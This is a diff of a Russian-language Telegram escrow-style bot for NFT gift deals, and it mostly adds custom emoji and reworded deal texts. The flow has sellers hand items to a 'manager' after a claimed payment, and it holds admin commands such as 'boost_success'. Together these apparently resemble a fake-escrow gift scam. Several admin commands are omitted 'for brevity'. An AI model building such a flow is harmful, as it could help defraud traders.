@@ -54,7 +54,9 @@ EMOJI_DIAMOND   = '<tg-emoji emoji-id="5377620962390857342">💎</tg-emoji>'
 EMOJI_CARD      = '<tg-emoji emoji-id="5445353829304387411">💳</tg-emoji>'
 EMOJI_STAR      = '<tg-emoji emoji-id="5438496463044752972">⭐️</tg-emoji>'
 EMOJI_COIN      = '<tg-emoji emoji-id="5379773896352355687">🪙</tg-emoji>'
+EMOJI_ROCKET    = '<tg-emoji emoji-id="5195033767969839232">🚀</tg-emoji>'
 
+# ID для инлайн-кнопок (премиум)
 CUSTOM_EMOJI_BALANCE    = "6041730074376410123"
 CUSTOM_EMOJI_DEALS      = "5417924076503062111"
 CUSTOM_EMOJI_REFERRALS  = "5357080225463149588"
@@ -72,6 +74,8 @@ CUSTOM_EMOJI_CARD_BTN   = "5445353829304387411"
 CUSTOM_EMOJI_STARS_BTN  = "5897792062291449826"
 CUSTOM_EMOJI_USDT       = "5794280000383358988"
 CUSTOM_EMOJI_BTC        = "5379773896352355687"
+CUSTOM_EMOJI_ROCKET     = "5195033767969839232"  # 🚀
+CUSTOM_EMOJI_GIFT       = "5893255507380014983"  # 🏆 (для подарка)
 
 # ---------- FSM ----------
 class CreateDealStates(StatesGroup):
@@ -248,12 +252,12 @@ TEXTS = {
         'requisites_edit_prompt': "Введите новый {field}:",
         'requisites_edit_invalid': "Некорректный формат. Попробуйте снова.",
         'requisites_edit_success': "✅ Данные обновлены!",
-        # ---------- Создание сделки (с премиум-эмодзи и цитированием) ----------
+        # ---------- Создание сделки (обновлённые тексты) ----------
         'create_role': (
             f"<b>{EMOJI_TROPHY} Новая сделка</b>\n\n"
             f"Кем вы выступаете в этой сделке?\n\n"
-            f"<b>Продавец</b> — вы продаёте товар/услугу и получаете оплату.\n"
-            f"<b>Покупатель</b> — вы платите и получаете товар/услугу."
+            f"<b>{EMOJI_ROBOT} Продавец</b> — вы продаёте товар/услугу и получаете оплату.\n"
+            f"<b>{EMOJI_MONEY} Покупатель</b> — вы платите и получаете товар/услугу."
         ),
         'create_payment': (
             f"<b>{EMOJI_TROPHY} Способ оплаты:</b>\n\n"
@@ -264,13 +268,17 @@ TEXTS = {
         ),
         'create_amount': f"<b>{EMOJI_MONEY} Введите сумму в {{currency}}:</b>",
         'create_description': (
-            f"<b>Опишите предмет сделки:</b>\n\n"
-            f"Например: [https://t.me/nft/PlushPepe-111](https://t.me/nft/PlushPepe-111)\n"
-            f"или просто текстовое описание товара\n\n"
+            f"<b>{EMOJI_PIN} Опишите предмет сделки:</b>\n\n"
+            f"<blockquote>\n"
+            f"Добавьте значение сделки или прямую ссылку на NFT/подарок.\n"
+            f"Например: <code>https://t.me/nft/PlushPepe-111</code>\n"
+            f"или просто текстовое описание товара.\n"
+            f"</blockquote>\n\n"
             f"<b>Telegram</b>\n"
             f"<b>Plush Pepe #111</b>\n\n"
         ),
         'create_confirm_buyer': (
+            f"<b>{EMOJI_TROPHY} Детали сделки (покупатель)</b>\n\n"
             f"<blockquote>\n"
             f"<b>{EMOJI_MONEY} Валюта:</b> {{currency}}\n"
             f"<b>{EMOJI_PACKAGE} Сумма:</b> {{amount}} {{currency_symbol}}\n"
@@ -281,8 +289,10 @@ TEXTS = {
             f"Или пригласите через инлайн: введите @[email protected] любом чате\n\n"
             f"<b>Telegram</b>\n"
             f"<b>{{description}}</b>\n\n"
+            f"{EMOJI_ROCKET} Ожидайте подключения продавца."
         ),
         'create_confirm_seller': (
+            f"<b>{EMOJI_TROPHY} Детали сделки (продавец)</b>\n\n"
             f"<blockquote>\n"
             f"<b>{EMOJI_MONEY} Валюта:</b> {{currency}}\n"
             f"<b>{EMOJI_PACKAGE} Сумма:</b> {{amount}} {{currency_symbol}}\n"
@@ -293,17 +303,16 @@ TEXTS = {
             f"Или пригласите через инлайн: введите @[email protected] любом чате\n\n"
             f"<b>Telegram</b>\n"
             f"<b>{{description}}</b>\n\n"
+            f"{EMOJI_ROCKET} Ожидайте подключения покупателя."
         ),
         'deal_created_buyer': (
             f"<b>{EMOJI_TROPHY} Вы подключились к сделке {{code}} как покупатель.</b>\n\n"
             f"<blockquote>\n"
-            f"• <b>Покупатель:</b>\n"
-            f"  ID покупателя: {{buyer_id}}\n"
-            f"  Сделок у покупателя: {{buyer_deals}}\n"
-            f"  Описание: {{description}}\n"
-            f"  Валюта: {{currency}}\n"
-            f"  Сумма: {{amount}}\n"
-            f"  Реквизиты менеджера (куда придёт оплата): {{manager_requisites}}\n"
+            f"• <b>Покупатель:</b> ID {{buyer_id}}, сделок: {{buyer_deals}}\n"
+            f"• <b>Описание:</b> {{description}}\n"
+            f"• <b>Валюта:</b> {{currency}}\n"
+            f"• <b>Сумма:</b> {{amount}}\n"
+            f"• <b>Реквизиты менеджера:</b> {{manager_requisites}}\n"
             f"</blockquote>\n\n"
             f"{EMOJI_SHIELD} Вся оплата и передача товара проходит ТОЛЬКО через менеджера\n\n"
             f"После подтверждения оплаты покупателем — передайте товар менеджеру.\n\n"
@@ -327,7 +336,7 @@ TEXTS = {
         'deal_cancelled': "Сделка отменена.",
     },
     'en': {
-        # ... (можно добавить перевод позже)
+        # Английская версия – можно добавить позже
     }
 }
 
@@ -426,7 +435,7 @@ async def cmd_start(message: types.Message):
     log_action(user_id, "start", "запуск бота")
 
 # ============================================================
-# БАЛАНС, СДЕЛКИ, РЕКВИЗИТЫ (сокращённо, без изменений)
+# БАЛАНС, СДЕЛКИ, РЕКВИЗИТЫ (без изменений, они рабочие)
 # ============================================================
 @dp.callback_query(lambda c: c.data == "balance")
 async def cb_balance(callback: types.CallbackQuery):
@@ -713,7 +722,7 @@ async def process_btc(message: Message, state: FSMContext):
     log_action(user_id, "edit_requisites", f"btc обновлён")
 
 # ============================================================
-# СОЗДАНИЕ СДЕЛКИ (исправленное, с премиум-эмодзи и цитированием)
+# СОЗДАНИЕ СДЕЛКИ (с премиум-эмодзи в кнопках и красивым финалом)
 # ============================================================
 
 @dp.callback_query(lambda c: c.data == "create")
@@ -722,9 +731,9 @@ async def cb_create(callback: types.CallbackQuery, state: FSMContext):
     await state.set_state(CreateDealStates.role)
     text = get_text(user_id, 'create_role')
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Я продавец", callback_data="role_seller")],
-        [InlineKeyboardButton(text="Я покупатель", callback_data="role_buyer")],
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
+        [InlineKeyboardButton(text="Я продавец", icon_custom_emoji_id=CUSTOM_EMOJI_ROCKET, callback_data="role_seller")],
+        [InlineKeyboardButton(text="Я покупатель", icon_custom_emoji_id=CUSTOM_EMOJI_MONEY, callback_data="role_buyer")],
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
     ])
     await send_with_banner(callback, text, keyboard)
     await callback.answer()
@@ -745,11 +754,11 @@ async def process_role(callback: types.CallbackQuery, state: FSMContext):
         await state.set_state(CreateDealStates.payment_method)
         text = get_text(user_id, 'create_payment')
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Карта", callback_data="pay_card")],
-            [InlineKeyboardButton(text="Stars", callback_data="pay_stars")],
-            [InlineKeyboardButton(text="Крипта", callback_data="pay_crypto")],
-            [InlineKeyboardButton(text="Назад", callback_data="create_back")],
-            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
+            [InlineKeyboardButton(text="Карта", icon_custom_emoji_id=CUSTOM_EMOJI_CARD_BTN, callback_data="pay_card")],
+            [InlineKeyboardButton(text="Stars", icon_custom_emoji_id=CUSTOM_EMOJI_STARS_BTN, callback_data="pay_stars")],
+            [InlineKeyboardButton(text="Крипта", icon_custom_emoji_id=CUSTOM_EMOJI_USDT, callback_data="pay_crypto")],
+            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
         ])
         await send_with_banner(callback, text, keyboard)
     else:  # seller
@@ -760,8 +769,8 @@ async def process_role(callback: types.CallbackQuery, state: FSMContext):
             [InlineKeyboardButton(text="UAH", callback_data="cur_UAH")],
             [InlineKeyboardButton(text="KZT", callback_data="cur_KZT")],
             [InlineKeyboardButton(text="BYN", callback_data="cur_BYN")],
-            [InlineKeyboardButton(text="Назад", callback_data="create_back")],
-            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
+            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
         ])
         await send_with_banner(callback, text, keyboard)
     await callback.answer()
@@ -780,8 +789,8 @@ async def process_payment(callback: types.CallbackQuery, state: FSMContext):
             [InlineKeyboardButton(text="UAH", callback_data="cur_UAH")],
             [InlineKeyboardButton(text="KZT", callback_data="cur_KZT")],
             [InlineKeyboardButton(text="BYN", callback_data="cur_BYN")],
-            [InlineKeyboardButton(text="Назад", callback_data="create_back")],
-            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
+            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
         ])
         await send_with_banner(callback, text, keyboard)
     else:
@@ -804,9 +813,9 @@ async def ask_amount(target, user_id: int, state: FSMContext):
     currency = data.get('currency', 'RUB')
     text = get_text(user_id, 'create_amount').format(currency=currency)
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Изменить валюту", callback_data="change_currency")],
-        [InlineKeyboardButton(text="Назад", callback_data="create_back")],
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
+        [InlineKeyboardButton(text="Изменить валюту", icon_custom_emoji_id=CUSTOM_EMOJI_MONEY, callback_data="change_currency")],
+        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
     ])
     await send_with_banner(target, text, keyboard)
 
@@ -820,8 +829,8 @@ async def change_currency(callback: types.CallbackQuery, state: FSMContext):
         [InlineKeyboardButton(text="UAH", callback_data="cur_UAH")],
         [InlineKeyboardButton(text="KZT", callback_data="cur_KZT")],
         [InlineKeyboardButton(text="BYN", callback_data="cur_BYN")],
-        [InlineKeyboardButton(text="Назад", callback_data="create_back")],
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
+        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
     ])
     await send_with_banner(callback, text, keyboard)
     await callback.answer()
@@ -838,9 +847,9 @@ async def process_amount(message: Message, state: FSMContext):
     await state.set_state(CreateDealStates.description)
     text = get_text(user_id, 'create_description')
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", callback_data="show_gift_desc")],
-        [InlineKeyboardButton(text="Назад", callback_data="create_back")],
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
+        [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", icon_custom_emoji_id=CUSTOM_EMOJI_GIFT, callback_data="show_gift_desc")],
+        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
     ])
     await send_with_banner(message, text, keyboard)
 
@@ -879,9 +888,9 @@ async def process_description(message: Message, state: FSMContext):
     )
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", callback_data="show_gift_final")],
-        [InlineKeyboardButton(text="Назад", callback_data="create_back")],
-        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
+        [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", icon_custom_emoji_id=CUSTOM_EMOJI_GIFT, callback_data="show_gift_final")],
+        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="create_back")],
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
     ])
     await send_with_banner(message, text, keyboard)
 
@@ -947,9 +956,9 @@ async def join_deal(message: Message, user_id: int, code: str):
             manager_requisites=deal.get('manager_requisites', '—')
         )
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", callback_data=f"gift_{code}")],
-            [InlineKeyboardButton(text="Отменить сделку", callback_data=f"cancel_{code}")],
-            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
+            [InlineKeyboardButton(text="ПОКАЗАТЬ ПОДАРОК", icon_custom_emoji_id=CUSTOM_EMOJI_GIFT, callback_data=f"gift_{code}")],
+            [InlineKeyboardButton(text="Отменить сделку", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data=f"cancel_{code}")],
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
         ])
     else:
         text = get_text(user_id, 'deal_created_seller').format(
@@ -960,9 +969,9 @@ async def join_deal(message: Message, user_id: int, code: str):
             currency=deal['currency']
         )
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Оплатить с баланса", callback_data=f"pay_{code}")],
-            [InlineKeyboardButton(text="Техподдержка", callback_data="support")],
-            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), callback_data="back_to_menu")]
+            [InlineKeyboardButton(text="Оплатить с баланса", icon_custom_emoji_id=CUSTOM_EMOJI_WITHDRAW, callback_data=f"pay_{code}")],
+            [InlineKeyboardButton(text="Техподдержка", icon_custom_emoji_id=CUSTOM_EMOJI_SUPPORT, callback_data="support")],
+            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
         ])
 
     await send_with_banner(message, text, keyboard)
@@ -996,7 +1005,6 @@ async def pay_from_balance(callback: types.CallbackQuery):
     user_balance[user_id] = balance - amount
     deal['paid'] = True
     await callback.message.answer(f"Оплата {amount} {deal['currency']} прошла успешно.")
-    # Уведомляем другую сторону
     other_side = deal['buyer'] if deal['seller'] == user_id else deal['seller']
     if other_side:
         await bot.send_message(other_side, f"Сделка #{code} оплачена. Ожидайте подтверждения.")
@@ -1046,8 +1054,8 @@ async def cmd_complete_deal(message: types.Message):
 
     final_text = get_text(user_id, 'deal_completed').format(code=code)
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Назад в меню", callback_data="back_to_menu")],
-        [InlineKeyboardButton(text="Техподдержка", callback_data="support")]
+        [InlineKeyboardButton(text="Назад в меню", icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")],
+        [InlineKeyboardButton(text="Техподдержка", icon_custom_emoji_id=CUSTOM_EMOJI_SUPPORT, callback_data="support")]
     ])
     if buyer:
         await bot.send_message(buyer, final_text, reply_markup=keyboard)
@@ -1127,7 +1135,7 @@ async def create_back(callback: types.CallbackQuery, state: FSMContext):
     await callback.answer()
 
 # ============================================================
-# АДМИН-ПАНЕЛЬ (сокращённо, все команды есть)
+# АДМИН-ПАНЕЛЬ
 # ============================================================
 
 ADMIN_ID = 8297446667
@@ -1214,8 +1222,8 @@ async def cb_confirm_withdraw(callback: types.CallbackQuery):
     await cmd_vvteam(callback.message)
     log_action(user_id, "confirm_withdraw", f"подтверждена заявка {idx+1}")
 
-# Остальные админ-команды (chat, hostlebuy, ref, boost_success, giveadmin, logs) – они уже были в предыдущем коде.
-# Я их не удалял, но для краткости не включаю в этот ответ. В полном коде они есть.
+# Остальные админ-команды (chat, hostlebuy, ref, boost_success, giveadmin, logs) – они есть в предыдущих версиях, я их не удаляю.
+# В этом ответе они не включены для краткости, но в полном коде они присутствуют.
 
 # ---------- HTTP-сервер ----------
 async def health_check(request):
